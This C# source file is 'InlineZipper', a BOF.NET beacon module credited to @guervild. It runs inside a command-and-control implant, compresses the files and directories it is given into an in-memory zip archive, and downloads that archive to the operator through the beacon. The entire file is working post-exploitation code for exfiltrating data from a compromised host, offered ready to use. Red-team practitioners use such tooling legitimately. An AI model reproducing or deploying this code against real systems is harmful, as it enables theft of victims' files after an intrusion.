using System;
using System.IO;
using System.Threading;
using BOFNET;
using Ionic.Zip;

namespace InlineZipper
{

    class Execute : BeaconObject
    {
        public Execute(BeaconApi api) : base(api) { }
        public volatile static Mutex mutex = new Mutex();

        internal static bool FileOrDirectoryExists(string name)
        {
            return (Directory.Exists(name) || File.Exists(name));
        }

        // From github.com/williamknows/SharpHound3
        public void PassDownloadFile(string filename, ref MemoryStream fileStream)
        {
            mutex.WaitOne();

            try
            {
                DownloadFile(filename, fileStream);
            }
            catch (Exception ex)
            {
                BeaconConsole.WriteLine(String.Format("[!] BOF.NET Exception during DownloadFile(): {0}.", ex));
            }

            mutex.ReleaseMutex();
        }

        public override void Go(string[] args)
        {

            BeaconConsole.WriteLine(@"    ____      ___         _____   _                      
   /  _/___  / (_)___  __/__  /  (_)___  ____  ___  _____
   / // __ \/ / / __ \/ _ \/ /  / / __ \/ __ \/ _ \/ ___/
 _/ // / / / / / / / /  __/ /__/ / /_/ / /_/ /  __/ /    
/___/_/ /_/_/_/_/ /_/\___/____/_/ .___/ .___/\___/_/     
                               /_/   /_/                 
    by @guervild
");
            if (args.Length < 1)
            {
                BeaconConsole.WriteLine("[!] Missing argument. You must at least pass one file or directory to zip !");
                return;
            }

            String zipName = $"{DateTime.Now:yyyyMMddHHmmss}_{Path.GetRandomFileName()}.zip";

            using (var zip = new Ionic.Zip.ZipFile())
            {

                zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;

                foreach (string arg in args)
                {
                    if (FileOrDirectoryExists(arg) == false)
                    {
                        BeaconConsole.WriteLine($"[!] Argument passed does not exists : {arg}");
                        return;
                    }
                    else
                    {
                        Console.WriteLine(FileOrDirectoryExists(arg));

                        string path = Path.GetFullPath(arg);

                        Console.WriteLine(path);

                        FileAttributes attr = File.GetAttributes(path);

                        //detect whether its a directory or file
                        if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                        {
                            DirectoryInfo dirInfo = new System.IO.DirectoryInfo(arg);

                            BeaconConsole.WriteLine($"[+] Argument passed is a directory");
                            BeaconConsole.WriteLine($"    |_ Path            : {dirInfo.FullName}");
                            BeaconConsole.WriteLine($"    |_ Last Write Time : {dirInfo.LastWriteTimeUtc} UTC");

                            try
                            {
                                zip.AddDirectory(arg, System.IO.Path.GetFileName(arg));
                            }
                            catch (Exception e)
                            {
                                BeaconConsole.WriteLine($"[!] Caught exception while adding directory : {e}");
                            }
                        }
                        else
                        {
                            FileInfo fInfo = new System.IO.FileInfo(arg);

                            BeaconConsole.WriteLine($"[+] Argument passed is a file");
                            BeaconConsole.WriteLine($"    |_ Path            : {arg}");
                            BeaconConsole.WriteLine($"    |_ Size            : {fInfo.Length} bytes");
                            BeaconConsole.WriteLine($"    |_ Last Write Time : {fInfo.LastWriteTimeUtc} UTC");

                            try
                            {
                                zip.AddFile(arg, "");
                            }
                            catch (Exception e)
                            {
                                BeaconConsole.WriteLine($"[!] Caught exception while adding file : {e}");
                            }
                        }
                    }
                }

                var mem = new MemoryStream();

                zip.Save(mem);

                mem.Position = 0;

                PassDownloadFile(zipName, ref mem);

                BeaconConsole.WriteLine($"[+] Succcessfull download");
                BeaconConsole.WriteLine($"    |_ Zip Name : {zipName}");
                BeaconConsole.WriteLine($"    |_ Size     : {mem.Length} bytes");

                mem.Close();

            }
        }

        static void Main(string[] args)
        {
        }
    }
}